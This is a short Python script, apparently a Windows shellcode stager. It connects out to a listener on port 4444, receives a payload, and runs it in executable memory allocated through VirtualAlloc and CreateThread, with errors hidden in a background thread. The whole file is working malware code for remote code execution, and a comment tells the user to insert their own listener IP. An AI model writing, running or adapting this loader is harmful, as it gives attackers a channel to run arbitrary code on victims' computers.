import ctypes
import socket
import threading

# Replace with your actual listener IP
TARGET_IP = "10.0.0.5"
TARGET_PORT = 4444

def execute_shellcode(shellcode):
    # Allocate memory for shellcode
    ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
    # Copy shellcode to allocated memory
    ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
    # Create thread to execute shellcode
    ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)

def start_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((TARGET_IP, TARGET_PORT))
        # Receive shellcode length and then the shellcode itself
        # This allows for dynamic payload delivery
        code = s.recv(4096)
        execute_shellcode(code)
    except:
        pass

threading.Thread(target=start_shell, daemon=True).start()
